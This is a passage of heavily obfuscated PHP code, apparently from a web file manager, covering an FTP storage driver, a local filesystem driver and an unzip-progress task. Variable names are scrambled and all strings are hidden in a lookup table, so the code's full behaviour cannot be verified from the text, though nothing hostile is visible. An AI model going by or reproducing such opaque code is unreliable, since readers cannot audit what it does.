$‘í°ˆé[76] => $àşõ‰²°); } public function has($®‡Ÿ°ıÄ, $²–êÜ³² = false, $í®ÀÊ = true) { $ç¶Öˆà„ =& $_SERVER[® ¨Ä®ñ]; $£óÕè†¤ = $áëÙÒ‘® = array(); $ûÈë¤—’ = $²–êÜ³² ? !0 : !1; $this->fileList($®‡Ÿ°ıÄ, $£óÕè†¤, $áëÙÒ‘®, $ûÈë¤—’); if ($²–êÜ³²) { return array($ç¶Öˆà„[202] => count($áëÙÒ‘®), $ç¶Öˆà„[203] => count($£óÕè†¤)); } if ($í®ÀÊ) { if (count($áëÙÒ‘®)) { return !0; } } else { if (count($£óÕè†¤)) { return !0; } } return !1; } public function listAll($«¨Ü½¦Š) { $«‚¦ıö± =& $_SERVER[® ¨Ä®ñ]; if (!$this->_isconn()) { return !1; } $ß€Á’ÑÄ = $‡ÏÂ¿‰ = array(); $this->fileList($«¨Ü½¦Š, $ß€Á’ÑÄ, $‡ÏÂ¿‰, !0); $¸ÎÑáÓ = array(); foreach ($‡ÏÂ¿‰ as $†Õ÷´›Ğ) { $¸ÎÑáÓ[$†Õ÷´›Ğ[$«‚¦ıö±[32]]] = $†Õ÷´›Ğ[$«‚¦ıö±[80]]; } foreach ($ß€Á’ÑÄ as $†Õ÷´›Ğ) { if (is_string($†Õ÷´›Ğ)) { $¸ÎÑáÓ[$†Õ÷´›Ğ] = 0; } } return $this->listAllFiles($«¨Ü½¦Š, array_keys($¸ÎÑáÓ), $¸ÎÑáÓ); } public function getContent($øµ«á’‰) { if (!$this->_isconn()) { return !1; } $øµ«á’‰ = $this->iconvSystem($øµ«á’‰); return $this->fileSubstr($øµ«á’‰); } public function setContent($µíåÊÕ, $Á£Ç©Ã“ = '') { if (!$this->_isconn()) { return !1; } $ãâ³ƒŸ‘ = $this->pathThis($this->iconvSystem($µíåÊÕ)); $¼Õšİ•¨ = $this->tempFile($ãâ³ƒŸ‘); file_put_contents($¼Õšİ•¨, $Á£Ç©Ã“); $«ØªÊ = $this->upload($µíåÊÕ, $this->iconvApp($¼Õšİ•¨)); $this->tempFileRemve($¼Õšİ•¨); return $«ØªÊ; } public function fileSubstr($·Êê™å, $âóÆÍÌÛ = 0, $†ØÃÑÆ± = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($·Êê™å, $âóÆÍÌÛ, $†ØÃÑÆ±); } private function ftpRequest($İ¿¹ô•×, $¤Í°¹…¡ = 0, $Ç­Ü±“’ = false) { $İ¿¹ô•× = $this->iconvSystem($İ¿¹ô•×); $ş«ùõğô = $this->scheme . $this->host . $_SERVER[® ¨Ä®ñ][4] . $this->port; $ˆ¸Ã‘ = curl_init(); curl_setopt($ˆ¸Ã‘, CURLOPT_URL, $ş«ùõğô . $this->pathEncode($İ¿¹ô•×)); curl_setopt($ˆ¸Ã‘, CURLOPT_USERPWD, "{$this->username}\72{$this->userpass}"); if ($Ç­Ü±“’) { $ÕŞßóĞû = $¤Í°¹…¡ + $Ç­Ü±“’ - 1; curl_setopt($ˆ¸Ã‘, CURLOPT_RANGE, "{$¤Í°¹…¡}\55{$ÕŞßóĞû}"); } curl_setopt($ˆ¸Ã‘, CURLOPT_RETURNTRANSFER, 1); $¹±ô­Ğ = curl_exec($ˆ¸Ã‘); curl_close($ˆ¸Ã‘); return $¹±ô­Ğ; } public function upload($Ñ¹úâš, $’¢Ç¯æ, $’ƒşÙ›á = false, $ŸëÜüÙ‚ = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($Ñ¹úâš))) { return !1; } $Ñ¹úâš = $this->iconvSystem($Ñ¹úâš); $’¢Ç¯æ = $this->iconvSystem($’¢Ç¯æ); $Šå­í¥Ñ = ftp_nb_put($this->connect, $Ñ¹úâš, $’¢Ç¯æ, FTP_BINARY); while ($Šå­í¥Ñ == FTP_MOREDATA) { $Šå­í¥Ñ = ftp_nb_continue($this->connect); } if ($Šå­í¥Ñ != FTP_FINISHED) { return !1; } return $this->getPathOuter($Ñ¹úâš); } public function download($‚õË¯¿æ, $äÅ¾…Ÿ˜ = '') { if (!$this->_isconn()) { return !1; } $ã‰ú¼ªç = $this->pathFather($äÅ¾…Ÿ˜); if (!IO::mkdir($ã‰ú¼ªç)) { return !1; } $‚õË¯¿æ = $this->iconvSystem($‚õË¯¿æ); $äÅ¾…Ÿ˜ = $this->iconvSystem($äÅ¾…Ÿ˜); $–†õùş = ftp_nb_get($this->connect, $äÅ¾…Ÿ˜, $‚õË¯¿æ, FTP_BINARY); while ($–†õùş == FTP_MOREDATA) { $–†õùş = ftp_nb_continue($this->connect); } if ($–†õùş != FTP_FINISHED) { return !1; } return $this->iconvApp($äÅ¾…Ÿ˜); } public function exist($ «ä†) { return $this->isFile($ «ä†) || $this->isFolder($ «ä†); } public function isFile($Õ¨¤áà­) { return !$this->isFolder($Õ¨¤áà­) && $this->objectMeta($Õ¨¤áà­); } public function isFolder($ËöÎÜ›Ô) { return $this->cacheMethod($_SERVER[® ¨Ä®ñ][198], $ËöÎÜ›Ô); } protected function objectMeta($Ä´“©ÔÍ) { return $this->cacheMethod($_SERVER[® ¨Ä®ñ][199], $Ä´“©ÔÍ); } protected function _objectMeta($×¾¦´Õó) { $ë‘Ÿ¬¥ =& $_SERVER[® ¨Ä®ñ]; if ($×¾¦´Õó == $ë‘Ÿ¬¥[12] || $×¾¦´Õó == $ë‘Ÿ¬¥[8]) { return array(); } if (!$this->_isconn()) { return !1; } $×¾¦´Õó = $this->iconvSystem($×¾¦´Õó); $²©¾˜Ó = array($ë‘Ÿ¬¥[32] => $this->iconvApp($×¾¦´Õó), $ë‘Ÿ¬¥[33] => $ë‘Ÿ¬¥[192], $ë‘Ÿ¬¥[80] => 0); @ftp_chdir($this->connect, $ë‘Ÿ¬¥[8]); $ÚòÃ±­¶ = @ftp_size($this->connect, $×¾¦´Õó); if ($ÚòÃ±­¶ != -1) { $²©¾˜Ó[$ë‘Ÿ¬¥[80]] = $ÚòÃ±­¶; } else { $ËåûÁÒ = @ftp_chdir($this->connect, $×¾¦´Õó); if (!$ËåûÁÒ) { return !1; } $²©¾˜Ó[$ë‘Ÿ¬¥[33]] = $ë‘Ÿ¬¥[79]; } return $²©¾˜Ó; } protected function _isFolder($äŠıêÜ¾) { $¹Å¹ŸÍ =& $_SERVER[® ¨Ä®ñ]; if ($äŠıêÜ¾ == $¹Å¹ŸÍ[12] || $äŠıêÜ¾ == $¹Å¹ŸÍ[8]) { return !0; } $‡…«ÖºÛ = $this->_objectMeta($äŠıêÜ¾); return isset($‡…«ÖºÛ[$¹Å¹ŸÍ[33]]) && $‡…«ÖºÛ[$¹Å¹ŸÍ[33]] == $¹Å¹ŸÍ[79] ? !0 : !1; } } class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($¸©µç«‘) { if (substr($¸©µç«‘, 0, 2) == $_SERVER[® ¨Ä®ñ][1349]) { $¸©µç«‘ = BASIC_PATH . substr($¸©µç«‘, 2); } return $¸©µç«‘; } public function iconvApp($º±—Â³Ë) { $ûºìºœÒ =& $_SERVER[® ¨Ä®ñ]; global $config; return $this->iconvTo($º±—Â³Ë, $config[$ûºìºœÒ[1347]], $config[$ûºìºœÒ[1346]]); } public function iconvSystem($”–ğé—) { $¿¤Éˆ”¦ =& $_SERVER[® ¨Ä®ñ]; global $config; return $this->iconvTo($”–ğé—, $config[$¿¤Éˆ”¦[1346]], $config[$¿¤Éˆ”¦[1347]]); } public function getPathOuter($Ôş«½å) { $Â›ôÔÄÑ =& $_SERVER[® ¨Ä®ñ]; $ÀÈçç²¾ = $this->iconvApp($this->pathBase); $Ôş«½å = $this->iconvApp($Ôş«½å); if (substr($ÀÈçç²¾, 0, 2) == $Â›ôÔÄÑ[1349]) { $ÀÈçç²¾ = BASIC_PATH . substr($ÀÈçç²¾, 2); } if (substr($Ôş«½å, 0, 2) == $Â›ôÔÄÑ[1349]) { $Ôş«½å = BASIC_PATH . substr($Ôş«½å, 2); } $ÀÈçç²¾ = KodIO::clear($ÀÈçç²¾); $Ôş«½å = KodIO::clear($Ôş«½å); $Ôş«½å = substr($Ôş«½å, strlen($ÀÈçç²¾)); if (empty($this->pathDriver)) { return $Ôş«½å; } return $this->pathDriver . $Â›ôÔÄÑ[8] . ltrim($Ôş«½å, $Â›ôÔÄÑ[8]); } public function mkfile($ºº¬‘ñ, $ãÚÑ÷ë = '', $êáâ²È = REPEAT_RENAME) { $ºº¬‘ñ = $this->iconvSystem($ºº¬‘ñ); @touch($ºº¬‘ñ); if ($ãÚÑ÷ë) { file_put_contents($ºº¬‘ñ, $ãÚÑ÷ë); } @chmod($ºº¬‘ñ, $this->pathAuth); return is_file($ºº¬‘ñ) ? $this->getPathOuter($ºº¬‘ñ) : !1; } public function mkdir($ô°Ş•¿¥, $€§µ¤îÔ = REPEAT_SKIP) { $ô°Ş•¿¥ = $this->iconvSystem($ô°Ş•¿¥); if (is_dir($ô°Ş•¿¥)) { return $this->getPathOuter($ô°Ş•¿¥); } @mkdir($ô°Ş•¿¥, $this->pathAuth, !0); @chmod($ô°Ş•¿¥, $this->pathAuth); return is_dir($ô°Ş•¿¥) ? $this->getPathOuter($ô°Ş•¿¥) : !1; } public function copyFile($Òœ¢Ï’÷, $Åï×‘¼ä) { $this->mkdir($this->pathFather($Åï×‘¼ä)); $Òœ¢Ï’÷ = $this->iconvSystem($Òœ¢Ï’÷); $Åï×‘¼ä = $this->iconvSystem($Åï×‘¼ä); $ÂÏÃçÇö = copy_64($Òœ¢Ï’÷, $Åï×‘¼ä); @chmod($Åï×‘¼ä, $this->pathAuth); return $ÂÏÃçÇö ? $this->getPathOuter($Åï×‘¼ä) : !1; } public function moveFile($´åÂÄøÉ, $Ëë¾¤¿ª) { $this->mkdir($this->pathFather($Ëë¾¤¿ª)); $´åÂÄøÉ = $this->iconvSystem($´åÂÄøÉ); $Ëë¾¤¿ª = $this->iconvSystem($Ëë¾¤¿ª); $“èèğÃŠ = intval(@rename($´åÂÄøÉ, $Ëë¾¤¿ª)); if (!$“èèğÃŠ) { if ($“èèğÃŠ = intval(@copy_64($´åÂÄøÉ, $Ëë¾¤¿ª))) { @unlink($´åÂÄøÉ); } } @chmod($Ëë¾¤¿ª, $this->pathAuth); return $“èèğÃŠ ? $this->getPathOuter($Ëë¾¤¿ª) : !1; } public function movePath($Ö•É•ïİ, $²–½ı´, $¾ŠçÏÁÎ = false) { $ÁŒ­ñ¥„ =& $_SERVER[® ¨Ä®ñ]; $Ö•É•ïİ = $this->iconvSystem($Ö•É•ïİ); $²–½ı´ = $this->iconvSystem($²–½ı´); $Ú«ŒÁŸ = rtrim($²–½ı´, $ÁŒ­ñ¥„[8]) . $ÁŒ­ñ¥„[8] . ($¾ŠçÏÁÎ ? $¾ŠçÏÁÎ : get_path_this($Ö•É•ïİ)); if (file_exists($Ú«ŒÁŸ)) { return !1; } $ó‚àŠ = intval(@rename($Ö•É•ïİ, $Ú«ŒÁŸ)); $ó‚àŠ = file_exists($Ú«ŒÁŸ); return $ó‚àŠ ? $this->getPathOuter($Ú«ŒÁŸ) : !1; } public function delFile($†æ“›ç¨) { $†æ“›ç¨ = $this->iconvSystem($†æ“›ç¨); if (!@unlink($†æ“›ç¨)) { @chmod($†æ“›ç¨, $this->pathAuth); if (!@unlink($†æ“›ç¨)) { return !1; } } else { return !0; } } public function delFolder($ããúƒŒù) { $…ø¯””è =& $_SERVER[® ¨Ä®ñ]; $ããúƒŒù = $this->iconvSystem($ããúƒŒù); if (!is_dir($ããúƒŒù)) { return !0; } if (!($´‚øç¼š = opendir($ããúƒŒù))) { return !1; } while (($µĞË’ø = readdir($´‚øç¼š)) !== !1) { if ($µĞË’ø == $…ø¯””è[10] || $µĞË’ø == $…ø¯””è[1356]) { continue; } $îÙ§è = $ããúƒŒù . $…ø¯””è[8] . $µĞË’ø; if (is_file($îÙ§è) || is_link($îÙ§è)) { if (!unlink($îÙ§è)) { chmod($îÙ§è, $this->pathAuth); if (!unlink($îÙ§è)) { return !1; } } } else { if (is_dir($îÙ§è)) { chmod($îÙ§è, $this->pathAuth); $îÙ§è = $this->iconvApp($îÙ§è); if (!$this->delFolder($îÙ§è)) { return !1; } } } } closedir($´‚øç¼š); return rmdir($ããúƒŒù); } public function rename($—Ô¡öÖ, $€«¼ºá×) { $íçÆ·‹ =& $_SERVER[® ¨Ä®ñ]; $æñ‹Şù‡ = $this->fileNameAuto($this->pathFather($—Ô¡öÖ), $€«¼ºá×); $æñ‹Şù‡ = $this->iconvSystem($æñ‹Şù‡); $—Ô¡öÖ = $this->iconvSystem($—Ô¡öÖ); $£­°õøÈ = $this->pathFather($—Ô¡öÖ); $€‚•ù­Ë = rtrim($£­°õøÈ, $íçÆ·‹[8]) . $íçÆ·‹[8] . $æñ‹Şù‡; $•´§¯È = @rename($—Ô¡öÖ, $€‚•ù­Ë); $€‚•ù­Ë = $this->iconvApp($€‚•ù­Ë); return $•´§¯È ? $this->getPathOuter($€‚•ù­Ë) : !1; } public function size($ø™ì¯Å) { $ø™ì¯Å = $this->iconvSystem($ø™ì¯Å); return filesize_64($ø™ì¯Å); } public function info($Èó‰Óîã) { $Èó‰Óîã = $this->iconvSystem($Èó‰Óîã); if ($this->isFolder($Èó‰Óîã)) { return $this->folderInfo($Èó‰Óîã); } else { if ($this->isFile($Èó‰Óîã)) { return $this->fileInfo($Èó‰Óîã); } } return !1; } protected function infoChildren($íÇ³šîı, &$÷Ø®÷ğÁ, $ïËãÚ = true) { $Å†äË¶¥ =& $_SERVER[® ¨Ä®ñ]; check_abort_echo(); $íÇ³šîı = rtrim($íÇ³šîı, $Å†äË¶¥[8]) . $Å†äË¶¥[8]; if ($ïËãÚ) { $íÇ³šîı = $this->iconvSystem($íÇ³šîı); } if (!($½˜ËÛĞ‚ = @opendir($íÇ³šîı))) { return; } while (($öãù¤‚× = readdir($½˜ËÛĞ‚)) !== !1) { if ($öãù¤‚× == $Å†äË¶¥[10] || $öãù¤‚× == $Å†äË¶¥[1356]) { continue; } $ƒ‰ŠÆñ = $íÇ³šîı . $öãù¤‚×; if (is_file($ƒ‰ŠÆñ) || is_link($ƒ‰ŠÆñ)) { $÷Ø®÷ğÁ[$Å†äË¶¥[81]]++; $÷Ø®÷ğÁ[$Å†äË¶¥[80]] += filesize_64($ƒ‰ŠÆñ); } else { if (is_dir($ƒ‰ŠÆñ)) { $÷Ø®÷ğÁ[$Å†äË¶¥[82]]++; $this->infoChildren($ƒ‰ŠÆñ, $÷Ø®÷ğÁ, !1); } } } closedir($½˜ËÛĞ‚); } private function folderInfo($µ…ñ›ÂŸ, $˜—Ù‘ª“ = false) { $Õ¨»á„¡ =& $_SERVER[® ¨Ä®ñ]; $µ…ñ›ÂŸ = rtrim($µ…ñ›ÂŸ, $Õ¨»á„¡[8]) . $Õ¨»á„¡[8]; $ª»®”î = $this->iconvApp($this->pathThis($µ…ñ›ÂŸ)); if ($˜—Ù‘ª“) { return array($Õ¨»á„¡[32] => $ª»®”î, $Õ¨»á„¡[78] => $this->getPathOuter($µ…ñ›ÂŸ), $Õ¨»á„¡[33] => $Õ¨»á„¡[79]); } $÷¥Í§ = array($Õ¨»á„¡[32] => $ª»®”î, $Õ¨»á„¡[78] => $this->getPathOuter($µ…ñ›ÂŸ), $Õ¨»á„¡[33] => $Õ¨»á„¡[79], $Õ¨»á„¡[193] => @filectime($µ…ñ›ÂŸ), $Õ¨»á„¡[86] => @filemtime($µ…ñ›ÂŸ), $Õ¨»á„¡[1359] => @fileatime($µ…ñ›ÂŸ), $Õ¨»á„¡[1360] => is_readable($µ…ñ›ÂŸ), $Õ¨»á„¡[1361] => is_writable($µ…ñ›ÂŸ), $Õ¨»á„¡[1362] => get_mode($µ…ñ›ÂŸ)); return $÷¥Í§; } private function fileInfo($­««Ç¿Ë, $Ù¿²µ«ö = false) { $‰¥Ìƒä‘ =& $_SERVER[® ¨Ä®ñ]; $¦ü§è¯¼ = $this->iconvApp($this->pathThis($­««Ç¿Ë)); if ($Ù¿²µ«ö) { return array($‰¥Ìƒä‘[32] => $¦ü§è¯¼, $‰¥Ìƒä‘[78] => $this->getPathOuter($­««Ç¿Ë), $‰¥Ìƒä‘[33] => $‰¥Ìƒä‘[192], $‰¥Ìƒä‘[80] => $this->size($­««Ç¿Ë), $‰¥Ìƒä‘[167] => $this->ext($¦ü§è¯¼)); } $¶ÖÇ–™á = array($‰¥Ìƒä‘[32] => $¦ü§è¯¼, $‰¥Ìƒä‘[78] => $this->getPathOuter($­««Ç¿Ë), $‰¥Ìƒä‘[33] => $‰¥Ìƒä‘[192], $‰¥Ìƒä‘[193] => @filectime($­««Ç¿Ë), $‰¥Ìƒä‘[86] => @filemtime($­««Ç¿Ë), $‰¥Ìƒä‘[1359] => @fileatime($­««Ç¿Ë), $‰¥Ìƒä‘[80] => $this->size($­««Ç¿Ë), $‰¥Ìƒä‘[167] => $this->ext($¦ü§è¯¼), $‰¥Ìƒä‘[1360] => is_readable($­««Ç¿Ë), $‰¥Ìƒä‘[1361] => is_writable($­««Ç¿Ë), $‰¥Ìƒä‘[1362] => get_mode($­««Ç¿Ë)); return $¶ÖÇ–™á; } public function exist($İËïé“Ì) { $İËïé“Ì = $this->iconvSystem($İËïé“Ì); return @file_exists($İËïé“Ì); } public function isFile($¡•²¿†§) { $¡•²¿†§ = $this->iconvSystem($¡•²¿†§); return @is_file($¡•²¿†§); } public function isFolder($¡ˆÉ×ˆ„) { $¡ˆÉ×ˆ„ = $this->iconvSystem($¡ˆÉ×ˆ„); return @is_dir($¡ˆÉ×ˆ„); } public function listPath($‰êé£´, $­”‚ã„ü = false) { $ùÔîş¿ö =& $_SERVER[® ¨Ä®ñ]; $‰êé£´ = $this->iconvSystem($‰êé£´); $‰êé£´ = rtrim($‰êé£´, $ùÔîş¿ö[8]) . $ùÔîş¿ö[8]; $€şŒ÷± = array($ùÔîş¿ö[77] => array(), $ùÔîş¿ö[76] => array()); if (!($ŞÎ‰ñßƒ = @opendir($‰êé£´))) { return $€şŒ÷±; } while (($˜Œ´¹­  = readdir($ŞÎ‰ñßƒ)) !== !1) { if ($˜Œ´¹­  == $ùÔîş¿ö[10] || $˜Œ´¹­  == $ùÔîş¿ö[1356]) { continue; } $†ç†ï° = $‰êé£´ . $˜Œ´¹­ ; if (is_file($†ç†ï°)) { $€şŒ÷±[$ùÔîş¿ö[76]][] = $this->fileInfo($†ç†ï°, $­”‚ã„ü); } else { $€şŒ÷±[$ùÔîş¿ö[77]][] = $this->folderInfo($†ç†ï°, $­”‚ã„ü); } } closedir($ŞÎ‰ñßƒ); return $€şŒ÷±; } public function listAll($Ù¨±¥ÉÓ, &$Ò‡ƒ‡Ğ¦ = array()) { $Ñ´©ƒ¬È =& $_SERVER[® ¨Ä®ñ]; $Ù¨±¥ÉÓ = $this->iconvSystem($Ù¨±¥ÉÓ); $Ù¨±¥ÉÓ = rtrim($Ù¨±¥ÉÓ, $Ñ´©ƒ¬È[8]) . $Ñ´©ƒ¬È[8]; if (!($™÷ì‡õ = @opendir($Ù¨±¥ÉÓ))) { return $Ò‡ƒ‡Ğ¦; } while (($¶§çŒ = readdir($™÷ì‡õ)) !== !1) { if ($¶§çŒ == $Ñ´©ƒ¬È[10] || $¶§çŒ == $Ñ´©ƒ¬È[1356]) { continue; } $À‹ÉŸè“ = $Ù¨±¥ÉÓ . $¶§çŒ; if (is_dir($À‹ÉŸè“) && !is_link($À‹ÉŸè“)) { $Ò‡ƒ‡Ğ¦[] = array($Ñ´©ƒ¬È[78] => $À‹ÉŸè“ . $Ñ´©ƒ¬È[8], $Ñ´©ƒ¬È[79] => 1, $Ñ´©ƒ¬È[86] => @filemtime($À‹ÉŸè“), $Ñ´©ƒ¬È[80] => 0); $this->listAll($À‹ÉŸè“, $Ò‡ƒ‡Ğ¦); } else { $Ò‡ƒ‡Ğ¦[] = array($Ñ´©ƒ¬È[78] => $À‹ÉŸè“, $Ñ´©ƒ¬È[79] => 0, $Ñ´©ƒ¬È[86] => @filemtime($À‹ÉŸè“), $Ñ´©ƒ¬È[80] => $this->size($À‹ÉŸè“)); } } closedir($™÷ì‡õ); return $Ò‡ƒ‡Ğ¦; } public function has($Ë¿®«­ç, $ĞêÒâ¸ = false, $‡Ûõ®î™ = true) { $‰ÜÙ¹İ± =& $_SERVER[® ¨Ä®ñ]; $Ë¿®«­ç = $this->iconvSystem($Ë¿®«­ç); $Ë¿®«­ç = rtrim($Ë¿®«­ç, $‰ÜÙ¹İ±[8]) . $‰ÜÙ¹İ±[8]; if (!($üøàÃ‘ = @opendir($Ë¿®«­ç))) { return !1; } $Øİ‰“¨ = 0; $Âú“»·ò = 0; $º²ìÉĞ = 0; while (($ÁÕºüœ… = readdir($üøàÃ‘)) !== !1) { if ($ÁÕºüœ… == $‰ÜÙ¹İ±[10] || $ÁÕºüœ… == $‰ÜÙ¹İ±[1356]) { continue; } $®µ€Éü’ = $Ë¿®«­ç . $ÁÕºüœ…; if ($ĞêÒâ¸) { $º²ìÉĞ++; if (@is_file($®µ€Éü’)) { $Øİ‰“¨++; } else { $Âú“»·ò++; } if ($º²ìÉĞ > 10000) { break; } continue; } if ($‡Ûõ®î™) { if (@is_file($®µ€Éü’)) { return !0; } } else { if (@is_dir($®µ€Éü’ . $‰ÜÙ¹İ±[8])) { return !0; } } } closedir($üøàÃ‘); if ($ĞêÒâ¸) { return array($‰ÜÙ¹İ±[202] => $Øİ‰“¨, $‰ÜÙ¹İ±[203] => $Âú“»·ò); } return !1; } public function hashSimple($…€Æ™æ¾) { $³ö¼ôÉì =& $_SERVER[® ¨Ä®ñ]; if (!$…€Æ™æ¾) { return md5($³ö¼ôÉì[12]); } $…€Æ™æ¾ = $this->iconvSystem($…€Æ™æ¾); $Ì‚ñ´¦± = $this->size($…€Æ™æ¾); $‚‘š„ÆŸ = 200; $¾€ˆ°‚Š = 50; if ($Ì‚ñ´¦± <= $‚‘š„ÆŸ * $¾€ˆ°‚Š) { return $this->hashMd5($…€Æ™æ¾) . $Ì‚ñ´¦±; } $êéŠ±ä– = $³ö¼ôÉì[12]; $àÃ˜ØÒô = intval($Ì‚ñ´¦± / $¾€ˆ°‚Š); $ƒÍØì¿â = fopen($…€Æ™æ¾, $³ö¼ôÉì[1363]); if (!$ƒÍØì¿â) { return $êéŠ±ä–; } for ($Û®Æ«–£ = 0; $Û®Æ«–£ < $¾€ˆ°‚Š; $Û®Æ«–£++) { fseek_64($ƒÍØì¿â, $àÃ˜ØÒô * $Û®Æ«–£); $êéŠ±ä– .= fread($ƒÍØì¿â, $‚‘š„ÆŸ); } fseek_64($ƒÍØì¿â, $Ì‚ñ´¦± - $‚‘š„ÆŸ); $êéŠ±ä– .= fread($ƒÍØì¿â, $‚‘š„ÆŸ); fclose($ƒÍØì¿â); return md5($êéŠ±ä–) . $Ì‚ñ´¦±; } public function getContent($À¾¤›Ó) { $À¾¤›Ó = $this->iconvSystem($À¾¤›Ó); return file_get_contents($À¾¤›Ó); } public function setContent($†Œ¶¦¯È, $­ºÄ»¡ = '') { $†Œ¶¦¯È = $this->iconvSystem($†Œ¶¦¯È); $À¦©âÊ = @file_put_contents($†Œ¶¦¯È, $­ºÄ»¡, LOCK_EX); clearstatcache(); @chmod($†Œ¶¦¯È, $this->pathAuth); return $À¦©âÊ === !1 ? !1 : !0; } public function fileSubstr($İ¦Âßñı, $ ›”ê¼€ = 0, $ÜĞäÅáˆ = false) { $¶ıãŠû =& $_SERVER[® ¨Ä®ñ]; $İ¦Âßñı = $this->iconvSystem($İ¦Âßñı); if ($ÜĞäÅáˆ === !1) { $ÜĞäÅáˆ = $this->size($İ¦Âßñı); } if ($ÜĞäÅáˆ <= 0) { return $¶ıãŠû[12]; } $ —‡ˆİÏ = fopen($İ¦Âßñı, $¶ıãŠû[1363]); if (!$ —‡ˆİÏ) { return !1; } fseek_64($ —‡ˆİÏ, $ ›”ê¼€); $¬áÏå» = fread($ —‡ˆİÏ, $ÜĞäÅáˆ); fclose($ —‡ˆİÏ); return $¬áÏå»; } public function upload($€ßğ„©–, $³ßı÷ÊÓ, $å‚Ì‡«ñ = false, $øÌ¤‡áÀ = REPEAT_REPLACE) { if ($å‚Ì‡«ñ) { return $this->moveFile($³ßı÷ÊÓ, $€ßğ„©–); } return $this->copyFile($³ßı÷ÊÓ, $€ßğ„©–); } public function setModifyTime($ùÑ”‚›ˆ, $Ë¡Ì‚Œ‰ = '') { @touch($ùÑ”‚›ˆ, intval($Ë¡Ì‚Œ‰)); } public function download($¶‘áĞ€, $—Û™ÛÛ«) { return $this->iconvSystem($¶‘áĞ€); } } goto b±óš‚ˆÏÀ; EÊÒÚŸ‹Õî: class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $¤ü‘¹ =& $_SERVER[® ¨Ä®ñ]; parent::startAfter(); Hook::bind($¤ü‘¹[1728], array($this, $¤ü‘¹[1729])); Hook::bind($¤ü‘¹[1176], array($this, $¤ü‘¹[1730])); $ûƒ§ñ¡ß =& $this->task; $ûƒ§ñ¡ß[$¤ü‘¹[1731]] = $¤ü‘¹[1181]; if (!$ûƒ§ñ¡ß[$¤ü‘¹[1539]]) { $ûƒ§ñ¡ß[$¤ü‘¹[1539]] = LNG($¤ü‘¹[1732]); } } protected function endAfter() { $à¹ô¦›â =& $_SERVER[® ¨Ä®ñ]; parent::endAfter(); Hook::unbind($à¹ô¦›â[1728], array($this, $à¹ô¦›â[1729])); Hook::unbind($à¹ô¦›â[1176], array($this, $à¹ô¦›â[1730])); } public function updateAfter() { $¸µœÈô  =& $_SERVER[® ¨Ä®ñ]; $¼–¥µ÷ =& $this->task; if (!$¼–¥µ÷[$¸µœÈô [768]] || !$¼–¥µ÷[$¸µœÈô [745]]) { return; } if ($¼–¥µ÷[$¸µœÈô [1731]] == $¸µœÈô [1181]) { $¶˜ŒÌÉŒ = 0; if ($¼–¥µ÷[$¸µœÈô [1687]]) { $¶˜ŒÌÉŒ = $¼–¥µ÷[$¸µœÈô [1688]] / $¼–¥µ÷[$¸µœÈô [1687]]; } $¼–¥µ÷[$¸µœÈô [1641]] = $¶˜ŒÌÉŒ * 0.3; } else { if ($¼–¥µ÷[$¸µœÈô [1731]] == $¸µœÈô [308]) { $¶˜ŒÌÉŒ = $¼–¥µ÷[$¸µœÈô [1640]] / $¼–¥µ÷[$¸µœÈô [768]]; $¼–¥µ÷[$¸µœÈô [1641]] = 0.3 + $¶˜ŒÌÉŒ * 0.4; } else { if ($¼–¥µ÷[$¸µœÈô [1731]] == $¸µœÈô [108]) { $°…•ªÖÓ = 0; if ($¼–¥µ÷[$¸µœÈô [1689]] == $¸µœÈô [108]) { $°…•ªÖÓ = $¼–¥µ÷[$¸µœÈô [1688]]; } $¶˜ŒÌÉŒ = ($¼–¥µ÷[$¸µœÈô [1692]] + $°…•ªÖÓ) / $¼–¥µ÷[$¸µœÈô [745]]; $¼–¥µ÷[$¸µœÈô [1641]] = 0.3 + 0.4 + $¶˜ŒÌÉŒ * 0.3; } } } if ($¼–¥µ÷[$¸µœÈô [1641]] > 0) { $òû­ÌŞ = timeFloat() - $¼–¥µ÷[$¸µœÈô [1643]] - $¼–¥µ÷[$¸µœÈô [1646]]; $¼–¥µ÷[$¸µœÈô [1647]] = $òû­ÌŞ * (1 - $¼–¥µ÷[$¸µœÈô [1641]]) / $¼–¥µ÷[$¸µœÈô [1641]]; } } public function addFile($üçñœ­ø) { $È²àåøá =& $_SERVER[® ¨Ä®ñ]; $ó‚—úÙ =& $this->task; $½…ñƒõœ = IO::info($üçñœ­ø); $ó‚—úÙ[$È²àåøá[1685]] = $½…ñƒõœ[$È²àåøá[32]]; $ó‚—úÙ[$È²àåøá[1687]] = $½…ñƒõœ[$È²àåøá[80]]; $ó‚—úÙ[$È²àåøá[1688]] = 0; $ó‚—úÙ[$È²àåøá[1048]] = $È²àåøá[1707]; $ó‚—úÙ[$È²àåøá[1689]] = $È²àåøá[1181]; $ó‚—úÙ[$È²àåøá[745]] = $½…ñƒõœ[$È²àåøá[80]]; $ó‚—úÙ[$È²àåøá[768]] = 1; $Â½Ÿ¦ãù = 0; $ó‚—úÙ[$È²àåøá[1696]] = array($È²àåøá[1697] => $Â½Ÿ¦ãù + 1, $È²àåøá[412] => $½…ñƒõœ[$È²àåøá[32]], $È²àåøá[78] => $½…ñƒõœ[$È²àåøá[78]], $È²àåøá[510] => $½…ñƒõœ[$È²àåøá[510]] ? $½…ñƒõœ[$È²àåøá[510]] : $½…ñƒõœ[$È²àåøá[78]]); $this->update(); } public function unzipAfter($‡–÷µõÀ) { $¸É’ı±¬ =& $_SERVER[® ¨Ä®ñ]; $ş“³÷‡û =& $this->task; $ş“³÷‡û[$¸É’ı±¬[1731]] = $¸É’ı±¬[108]; $àÍùìºå = IO::infoWithChildren($‡–÷µõÀ); $¾º¢ì¼¸ = 0; $ş“³÷‡û[$¸É’ı±¬[1696]] = array($¸É’ı±¬[1697] => $¾º¢ì¼¸ + 1, $¸É’ı±¬[412] => $àÍùìºå[$¸É’ı±¬[32]], $¸É’ı±¬[78] => $àÍùìºå[$¸É’ı±¬[78]], $¸É’ı±¬[510] => $àÍùìºå[$¸É’ı±¬[510]] ? $àÍùìºå[$¸É’ı±¬[510]] : $àÍùìºå[$¸É’ı±¬[78]]); if ($àÍùìºå[$¸É’ı±¬[33]] == $¸É’ı±¬[192]) { $ş“³÷‡û[$¸É’ı±¬[768]] = 1; } else { $ş“³÷‡û[$¸É’ı±¬[768]] = $àÍùìºå[$¸É’ı±¬[83]][$¸É’ı±¬[81]]; } $ş“³÷‡û[$¸É’ı±¬[1048]] = 